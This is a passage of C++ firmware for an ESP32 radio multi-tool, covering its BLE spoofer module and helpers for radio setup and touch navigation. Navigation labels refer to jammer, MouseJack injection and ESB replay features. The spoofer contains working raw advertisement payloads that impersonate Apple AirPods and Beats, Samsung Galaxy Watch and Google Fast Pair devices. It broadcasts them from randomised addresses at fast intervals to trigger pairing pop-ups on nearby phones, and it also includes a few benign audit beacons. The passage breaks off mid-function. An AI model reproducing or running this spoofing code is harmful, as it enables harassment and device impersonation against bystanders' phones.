#include "SettingsStore.h"
#include "Touchscreen.h"
#include "config.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "icon.h"
#include "NrfSupervisor.h"
#include "shared.h"
#include "utils.h"

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

static constexpr int kBleScreenH = 320;

static int bleContentBottom() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() : kBleScreenH;
}

bool ensureBleStackReady() {
  // NimBLE can be deliberately deinitialised while a memory-heavy Wi-Fi
  // feature owns the radio.  Query the library instead of keeping a private
  // one-way latch, otherwise the first BLE feature after Captive Portal would
  // believe the controller was still running.
  if (BLEDevice::getInitialized()) {
    return true;
  }
  const uint32_t heap = ESP.getFreeHeap();
  Serial.printf("[ble] init begin, free heap=%u\n", (unsigned)heap);
#if !BOARD_HAS_ESP32S3
  // Classic ESP32 NimBLE typically needs ~40KB+ free; abort soft instead of OOM reboot.
  if (heap < 40000u) {
    Serial.println("[ble] skip init — low heap");
    return false;
  }
#endif
  // Classic BT controller RAM is unused by NimBLE; reclaim it before stack init.
  // On ESP32 this often frees ~30KB and avoids boot OOM/reboot after the intro.
  esp_err_t rel = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
  if (rel != ESP_OK && rel != ESP_ERR_INVALID_STATE) {
    Serial.printf("[ble] classic mem_release: %s\n", esp_err_to_name(rel));
  }
  BLEDevice::init(ESP32DIV_NAME);
  Serial.printf("[ble] init done, free heap=%u\n", (unsigned)ESP.getFreeHeap());
  return true;
}

static bool bleRequireStackOrExit() {
  if (ensureBleStackReady()) {
    return true;
  }
  tft.fillScreen(TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(UI_WARN, TFT_BLACK);
  tft.setCursor(12, 120);
  tft.print("BLE: low memory");
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(12, 140);
  tft.print("Exit and try again");
  delay(1200);
  feature_exit_requested = true;
  return false;
}

static int bleMaxLinesInZone(int contentTop, int lineHeight) {
  const int h = bleContentBottom() - contentTop;
  if (h <= 0 || lineHeight <= 0) {
    return 1;
  }
  return h / lineHeight;
}

static void bleClearBody(uint16_t color = TFT_BLACK) {
  if (featureHasTouchNavBar()) {
    featureClearContent(color);
  } else {
    tft.fillScreen(color);
  }
}

static void bleSetExitOnlyNavLabels() {
  setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, nullptr);
}

static void bleSetJammerNavLabels() {
  setTouchNavLabels("Mode-", nullptr, "Exit", "Toggle", "Mode+");
}

static void bleSetScannerNavLabels() {
  setTouchNavLabels("Cal", "Scan", "Exit", nullptr, nullptr);
}

static void bleSetEsbNavLabels() {
  setTouchNavLabels("Ch-", "Log", "Exit", "Hop", "Ch+");
}

static void bleSetEsbReplayNavLabels() {
  setTouchNavLabels("Prev", "Arm", "Exit", "Play", "Next");
}

static void bleSetMouseJackNavLabels() {
  setTouchNavLabels("Clr", "Pause", "Exit", nullptr, nullptr);
}

static void bleSetMjInjectNavLabels() {
  setTouchNavLabels("Prev", "Pay", "Exit", "Fire", "Next");
}

static constexpr unsigned long kBleNavDebounceMs = 200;

static void bleWaitButtonRelease(int pin) {
  while (isButtonPressed(pin)) {
    delay(10);
  }
  delay(kBleNavDebounceMs);
}

static void bleWaitNavRelease(int pin1, int pin2 = -1, int pin3 = -1) {
  while (isButtonPressed(pin1) ||
         (pin2 >= 0 && isButtonPressed(pin2)) ||
         (pin3 >= 0 && isButtonPressed(pin3))) {
    delay(10);
  }
  delay(kBleNavDebounceMs);
}

// The electrical supply fault has been corrected on the DIV 2.1 PCB. Keep
// the official fixed RF24 output level and vary only the number of radios.
static constexpr rf24_pa_dbm_e kNrfFixedPower = RF24_PA_MAX;
// nRF24L01+ specifies a 10 MHz maximum SPI clock. The former 16 MHz setting
// was out of spec and became especially unreliable after PN532 software-SPI
// had reversed the GPIO11/GPIO13 directions. 4 MHz leaves ample margin; SPI
// is used only for register/FIFO access and does not reduce over-air RF rate.
static constexpr uint32_t kNrfSpiHz = 4000000;

static bool beginNrfRadioReliable(RF24& radio) {
  for (uint8_t attempt = 0; attempt < 4u; ++attempt) {
    if (attempt > 0) {
      prepareNrfSharedSpiBus();
    }
    if (radio.begin() && radio.isChipConnected()) return true;
    delay((unsigned long)(attempt + 1u) * 8UL);
  }
  return false;
}

// Single-radio scanner/replay tools historically used NRF3. In 2-radio mode
// they transparently use NRF2, so GPIO14/21 remain an electrically idle NRF3.
static int configuredNrfAuxCePin() {
  return thirdNrfEnabled() ? CE_PIN_3 : CE_PIN_2;
}

static int configuredNrfAuxCsnPin() {
  return thirdNrfEnabled() ? CSN_PIN_3 : CSN_PIN_2;
}

namespace Scanner { void scannerHandleNavButtons(); }
namespace ProtoKill { void prokillHandleNavButtons(); }
namespace EsbSniffer { void esbHandleNavButtons(); }

static void bleSetSpooferNavLabels() {
  setTouchNavLabels("Prev", "Type", "Exit", "Power", "Next");
}

static void prepareBleFeatureEntry() {
  // Packet Monitor installs an IDF promiscuous callback outside Arduino's BLE
  // lifecycle. Always quiesce it before the BT controller is touched, even if
  // the previous screen claims it already shut down.
  PacketMonitor::ptmShutdown();
  pauseBackgroundRadioTasks();
  WiFi.scanDelete();
  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_OFF);
  delay(40);

  // BLE does not use the external SPI bus.  Do not probe/remount SD here:
  // SD.begin() is a storage concern and can stall an otherwise unrelated BLE
  // transition.  Storage features validate the card when they actually open
  // it, while radio exits leave all chip-selects electrically idle.
}

namespace BleSpoofer {

#define SCREEN_HEIGHT 250
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String spooferBuffer[MAX_LINES];
uint16_t colorspooferBuffer[MAX_LINES];
int spooferlineIndex = 0;

static bool uiDrawn = false;
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 5

static int iconX[ICON_NUM] = {90, 130, 170, 210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;

BLEAdvertising *pAdvertising;
std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

uint32_t delayMillisecond = 1000;
unsigned long lastDebounceTimeNext = 0;
unsigned long lastDebounceTimePrev = 0;
unsigned long lastDebounceTimeAdvNext = 0;
unsigned long lastDebounceTimeAdvPrev = 0;

int lastButtonStateNext = LOW;
int lastButtonStatePrev = LOW;
int lastButtonStateAdvNext = LOW;
int lastButtonStateAdvPrev = LOW;

unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500;

bool isAdvertising = false;

int scanTime = 5;
int deviceType = 1;
int delaySeconds = 1;
int advType = 1;
int attack_state = 1;
int device_choice = 0;
int device_index = 0;

// Samsung devices (15 bytes)
struct WatchModel {
  uint8_t value;
  const char* name;
};
const WatchModel samsungModels[] = {
  {0x01, "Galaxy Watch 4"},
  {0x02, "Galaxy Watch 5"},
  {0x03, "Galaxy Watch 6"}
};
const uint8_t samsungModelCount = 3;
const uint8_t SAMSUNG_ADV_SIZE = 15;
const uint16_t SAMSUNG_COMPANY_ID = 0x0075;
const uint8_t SAMSUNG_ADV_TEMPLATE[SAMSUNG_ADV_SIZE] = {
  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
};

// Google device (14 bytes, single model)
const uint8_t GOOGLE_ADV_SIZE = 14;
const uint16_t GOOGLE_FAST_PAIR_ID = 0xFE2C;
const uint8_t GOOGLE_ADV_TEMPLATE[GOOGLE_ADV_SIZE] = {
  0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit Service UUIDs
  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27, // Service Data
  0x02, 0x0A, 0x00 // TX Power (placeholder, set dynamically)
};

// Standards-based audit advertisements.  These are deliberately ordinary,
// non-crashing BLE beacons/services: they let Android, iOS and generic BLE
// scanners validate discovery, parsing and filtering without relying on a
// vendor pairing-popup exploit.
struct AuditAdvProfile {
  const char* name;
  const uint8_t* data;
  uint8_t length;
};

static const uint8_t kAdvIBeacon[] = {
  0x02, 0x01, 0x06,
  0x1A, 0xFF, 0x4C, 0x00, 0x02, 0x15,
  0x4D, 0x4B, 0x53, 0x49, 0x47, 0x4E, 0x41, 0x4C,
  0x44, 0x49, 0x56, 0x32, 0x31, 0x4C, 0x41, 0x42,
  0x00, 0x01, 0x00, 0x01, 0xC5
};
static const uint8_t kAdvEddystoneUid[] = {
  0x02, 0x01, 0x06, 0x03, 0x03, 0xAA, 0xFE,
  0x17, 0x16, 0xAA, 0xFE, 0x00, 0xEE,
  0x4D, 0x4B, 0x53, 0x49, 0x47, 0x4E, 0x41, 0x4C, 0x32, 0x31,
  0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00
};
static const uint8_t kAdvHeartRate[] = {
  0x02, 0x01, 0x06, 0x03, 0x03, 0x0D, 0x18,
  0x08, 0x09, 'M', 'K', ' ', 'H', 'e', 'a', 'r', 't'
};
static const uint8_t kAdvBattery[] = {
  0x02, 0x01, 0x06, 0x03, 0x03, 0x0F, 0x18,
  0x0B, 0x09, 'M', 'K', ' ', 'B', 'a', 't', 't', 'e', 'r', 'y'
};
static const uint8_t kAdvEnvironmental[] = {
  0x02, 0x01, 0x06, 0x03, 0x03, 0x1A, 0x18,
  0x07, 0x09, 'M', 'K', ' ', 'E', 'n', 'v'
};
static const uint8_t kAdvDeviceInfo[] = {
  0x02, 0x01, 0x06, 0x03, 0x03, 0x0A, 0x18,
  0x0A, 0x09, 'M', 'K', ' ', 'D', 'I', 'V', ' ', '2', '.', '1'
};

static const AuditAdvProfile kAuditProfiles[] = {
  {"iBeacon Test", kAdvIBeacon, sizeof(kAdvIBeacon)},
  {"Eddystone UID", kAdvEddystoneUid, sizeof(kAdvEddystoneUid)},
  {"Heart Rate", kAdvHeartRate, sizeof(kAdvHeartRate)},
  {"Battery Service", kAdvBattery, sizeof(kAdvBattery)},
  {"Env Sensor", kAdvEnvironmental, sizeof(kAdvEnvironmental)},
  {"Device Info", kAdvDeviceInfo, sizeof(kAdvDeviceInfo)},
};
static constexpr int kVendorDeviceCount = 21;
static constexpr int kAuditProfileCount =
    (int)(sizeof(kAuditProfiles) / sizeof(kAuditProfiles[0]));
static constexpr int kSpooferDeviceCount = kVendorDeviceCount + kAuditProfileCount;

const uint8_t DEVICES[][31] = {
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
  if (modelIndex >= samsungModelCount) return false;
  uint8_t advDataRaw[SAMSUNG_ADV_SIZE];
  memcpy(advDataRaw, SAMSUNG_ADV_TEMPLATE, SAMSUNG_ADV_SIZE);
  advDataRaw[SAMSUNG_ADV_SIZE - 1] = samsungModels[modelIndex].value;
  advData.addData(std::string((char*)advDataRaw, SAMSUNG_ADV_SIZE));
  return true;
}

bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
  uint8_t advDataRaw[GOOGLE_ADV_SIZE];
  memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
  advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100);
  advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
  return true;
}

BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) { // Apple
    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
  } else if (device_choice == 1) { // Samsung
    uint8_t samsungIndex = device_index;
    generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
  } else if (device_choice == 2) { // Google
    generateGoogleAdvPacket(oAdvertisementData);
  } else if (device_choice == 3) { // standards-based audit profile
    const int profile = constrain(device_index, 0, kAuditProfileCount - 1);
    oAdvertisementData.addData(std::string(
        (const char*)kAuditProfiles[profile].data,
        kAuditProfiles[profile].length));
  }

  return oAdvertisementData;
}

static constexpr int SPOOFER_LOG_TOP = 45;

static int spooferPanelTop() {
  const int panelH = featureHasTouchNavBar() ? 27 : 50;
  return bleContentBottom() - panelH;
}

static int spooferLogBottom() {
  return spooferPanelTop();
}

static int spooferVisibleLines() {
  const int h = spooferLogBottom() - SPOOFER_LOG_TOP;
  if (h <= 0) {
    return 1;
  }
  return h / LINE_HEIGHT;
}

static bool spooferLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= spooferLogBottom();
}

void Printspoofer(String text, uint16_t color, bool extraSpace = false) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  const int visibleLines = spooferVisibleLines();
  if (spooferlineIndex >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      spooferBuffer[i] = spooferBuffer[i + 1];
      colorspooferBuffer[i] = colorspooferBuffer[i + 1];
    }
    spooferlineIndex = visibleLines - 1;
  }

  spooferBuffer[spooferlineIndex] = text;
  colorspooferBuffer[spooferlineIndex] = color;
  spooferlineIndex++;

  if (extraSpace && spooferlineIndex < visibleLines) {
    spooferBuffer[spooferlineIndex] = "";
    colorspooferBuffer[spooferlineIndex] = TFT_WHITE;
    spooferlineIndex++;
  }

  for (int i = 0; i < spooferlineIndex && i < visibleLines; i++) {
    int yPos = i * LINE_HEIGHT + SPOOFER_LOG_TOP;
    if (!spooferLineFits(yPos)) {
      continue;
    }

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(colorspooferBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(spooferBuffer[i]);
  }
}

void sppferLoadingBar(int step) {
  int totalSteps = 4;
  int filledBlocks = (step * 20) / totalSteps;

  String bar = "[";
  for (int i = 0; i < 20; i++) {
    bar += (i < filledBlocks) ? "#" : "_";
  }
  bar += "]";

  Printspoofer(bar, TFT_GREEN);
}

static int s_spooferPanelLastTop = -1;
static int s_spooferPanelLastH = -1;
static int s_lastSpooferDevice = -1;
static int s_lastSpooferAdv = -1;
static bool s_spooferChromeReady = false;

static constexpr int SPOOFER_VALUE_X = 58;
static constexpr int SPOOFER_VALUE_W = 178;

static void spooferResetPanelCache() {
  s_spooferChromeReady = false;
  s_lastSpooferDevice = -1;
  s_lastSpooferAdv = -1;
  s_spooferPanelLastTop = -1;
  s_spooferPanelLastH = -1;
}

static const char* spooferDeviceLabel(int type) {
  if (type > kVendorDeviceCount && type <= kSpooferDeviceCount) {
    return kAuditProfiles[type - kVendorDeviceCount - 1].name;
  }
  switch (type) {
    case 1: return "Airpods";
    case 2: return "Airpods Pro";
    case 3: return "Airpods Max";
    case 4: return "Airpods Gen 2";
    case 5: return "Airpods Gen 3";
    case 6: return "Airpods Pro Gen 2";
    case 7: return "PowerBeats";
    case 8: return "PowerBeats Pro";
    case 9: return "Beats Solo Pro";
    case 10: return "Beats Buds";
    case 11: return "Beats Flex";
    case 12: return "BeatsX";
    case 13: return "Beats Solo3";
    case 14: return "Beats Studio3";
    case 15: return "Beats StudioPro";
    case 16: return "Beats FitPro";
    case 17: return "Beats BudsPlus";
    case 18: return "Galaxy Watch 4";
    case 19: return "Galaxy Watch 5";
    case 20: return "Galaxy Watch 6";
    case 21: return "Google Smart Ctrl";
    default: return "Airpods";
  }
}

static const char* spooferAdvLabel(int type) {
  switch (type) {
    case 1: return "IND";
    case 2: return "DIRECT HIGH";
    case 3: return "SCAN";
    case 4: return "NONCONN";
    case 5: return "DIRECT LOW";
    default: return "IND";
  }
}

static String spooferFitText(const char* text, int maxWidth) {
  String out = text;
  tft.setTextSize(1);
  if (tft.textWidth(out) <= maxWidth) {
    return out;
  }
  while (out.length() > 1 && tft.textWidth(out + "...") > maxWidth) {
    out.remove(out.length() - 1);
  }
  if (!out.isEmpty()) {
    out += "...";
  }
  return out;
}

static void spooferDrawValueWell(int y, int h, const char* text) {
  tft.fillRect(SPOOFER_VALUE_X, y, SPOOFER_VALUE_W, h, DARK_GRAY);
  tft.drawRect(SPOOFER_VALUE_X, y, SPOOFER_VALUE_W, h, DARK_GRAY);

  const String fitted = spooferFitText(text, SPOOFER_VALUE_W - 8);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.setCursor(SPOOFER_VALUE_X + 4, y + ((h - 8) / 2));
  tft.print(fitted);
}

static void spooferLayoutRows(int panelTop, int panelH, int& row1Y, int& row2Y, int& rowH,
                              const char*& advCaption) {
  if (panelH >= 36) {
    rowH = 14;
    row1Y = panelTop + 3;
    row2Y = panelTop + 18;
    advCaption = "Adv Type:";
  } else {
    rowH = 10;
    row1Y = panelTop + 2;
    row2Y = panelTop + 13;
    advCaption = "Adv:";
  }
}

void updateSpoofer() {
  const int panelTop = spooferPanelTop();
  const int panelH = bleContentBottom() - panelTop;
  if (panelTop < 40 || panelH <= 0) {
    return;
  }

  int row1Y = 0;
  int row2Y = 0;
  int rowH = 0;
  const char* advCaption = "Adv Type:";
  spooferLayoutRows(panelTop, panelH, row1Y, row2Y, rowH, advCaption);

  const bool layoutChanged =
    (panelTop != s_spooferPanelLastTop || panelH != s_spooferPanelLastH);
  const bool needChrome = !s_spooferChromeReady || layoutChanged;
  const bool deviceChanged = (deviceType != s_lastSpooferDevice);
  const bool advChanged = (advType != s_lastSpooferAdv);

  if (!needChrome && !deviceChanged && !advChanged) {
    return;
  }

  if (needChrome) {
    tft.drawFastHLine(0, panelTop - 1, 240, UI_LINE);
    tft.fillRect(0, panelTop, 240, panelH, DARK_GRAY);

    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE, DARK_GRAY);
    tft.setCursor(5, row1Y + ((rowH - 8) / 2));
    tft.print("Device:");
    tft.setCursor(5, row2Y + ((rowH - 8) / 2));
    tft.print(advCaption);

    s_spooferChromeReady = true;
    s_spooferPanelLastTop = panelTop;
    s_spooferPanelLastH = panelH;
    s_lastSpooferDevice = -1;
    s_lastSpooferAdv = -1;
  }

  if (needChrome || deviceChanged) {
    spooferDrawValueWell(row1Y, rowH, spooferDeviceLabel(deviceType));
    s_lastSpooferDevice = deviceType;
  }

  if (needChrome || advChanged) {
    spooferDrawValueWell(row2Y, rowH, spooferAdvLabel(advType));
    s_lastSpooferAdv = advType;
  }
}

void Airpods() {
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  device_choice = 0;
  device_index = 11;
  attack_state = 1;
}

void Beats_Solo_3() {
  device_choice = 0;
  device_index = 12;
  attack_state = 1;
}

void Beats_Studio_3() {
  device_choice = 0;
  device_index = 13;
  attack_state = 1;
}

void Beats_Studio_Pro() {
  device_choice = 0;
  device_index = 14;
  attack_state = 1;
}

void Betas_Fit_Pro() {
  device_choice = 0;
  device_index = 15;
}

void Beats_Studio_Buds_Plus() {
  device_choice = 0;
  device_index = 16;
  attack_state = 1;
}

// Android devices
void Galaxy_Watch_4() {
  device_choice = 1; // Samsung
  device_index = 0;
  attack_state = 1;
}

void Galaxy_Watch_5() {
  device_choice = 1; // Samsung
  device_index = 1;
  attack_state = 1;
}

void Galaxy_Watch_6() {
  device_choice = 1; // Samsung
  device_index = 2;
  attack_state = 1;
}

void Google_Smart_Ctrl() {
  device_choice = 2; // Google
  device_index = 0;
  attack_state = 1;
}

static void Audit_Profile(int profile) {
  device_choice = 3;
  device_index = constrain(profile, 0, kAuditProfileCount - 1);
  attack_state = 1;
}

void setAdvertisingData() {

  switch (deviceType) {
    case 1:
      Airpods();
      break;
    case 2:
      Airpods_pro();
      break;
    case 3:
      Airpods_Max();
      break;
    case 4:
      Airpods_Gen_2();
      break;
    case 5:
      Airpods_Gen_3();
      break;
    case 6:
      Airpods_Pro_Gen_2();
      break;
    case 7:
      Power_Beats();
      break;
    case 8:
      Power_Beats_Pro();
      break;
    case 9:
      Beats_Solo_Pro();
      break;
    case 10:
      Beats_Studio_Buds();
      break;
    case 11:
      Beats_Flex();
      break;
    case 12:
      Beats_X();
      break;
    case 13:
      Beats_Solo_3();
      break;
    case 14:
      Beats_Studio_3();
      break;
    case 15:
      Beats_Studio_Pro();
      break;
    case 16:
      Betas_Fit_Pro();
      break;
    case 17:
      Beats_Studio_Buds_Plus();
      break;
    case 18:
      Galaxy_Watch_4();
      break;
    case 19:
      Galaxy_Watch_5();
      break;
    case 20:
      Galaxy_Watch_6();
      break;
    case 21:
      Google_Smart_Ctrl();
      break;
    default:
      if (deviceType > kVendorDeviceCount && deviceType <= kSpooferDeviceCount) {
        Audit_Profile(deviceType - kVendorDeviceCount - 1);
      } else {
        Airpods();
      }
      break;
  }
}

void handleButtonPress(int pin, void (*callback)()) {
  static unsigned long lastPressTime[8] = {0};
  static uint8_t lastState[8] = {HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH};

  int index = pin % 8;
  uint8_t currentState = isButtonPressed(pin) ? LOW : HIGH;

  if (currentState == LOW && lastState[index] == HIGH) {
    unsigned long currentTime = millis();

    if ((currentTime - lastPressTime[index]) > debounceDelay) {
      callback();
      lastPressTime[index] = currentTime;
    }
  }

  lastState[index] = currentState;
}

void changeDeviceTypeNext() {
  deviceType++;
  if (deviceType > kSpooferDeviceCount) deviceType = 1;
  Serial.println("Device Type Next: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeDeviceTypePrev() {
  deviceType--;
  if (deviceType < 1) deviceType = kSpooferDeviceCount;
  Serial.println("Device Type Prev: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void toggleAdvertising() {
  isAdvertising = !isAdvertising;

  if (!isAdvertising) {
    pAdvertising->stop();
    Serial.println("Advertising stopped.");
    Printspoofer("[!] Advertising stopped", TFT_YELLOW, true);
    updateSpoofer();
  } else {
    if (attack_state == 1) {
      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) {
          dummy_addr[i] |= 0xF0;
        }
      }

      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
      pAdvertising->stop();
      pAdvertising->reset();
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20);
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();

      Printspoofer("[+] Device Type: " + String(deviceType), TFT_WHITE, false);
      Printspoofer("[+] Advertising Type: " + String(advType), TFT_WHITE, false);
      Printspoofer("[!] Advertising started", TFT_YELLOW, false);
    }

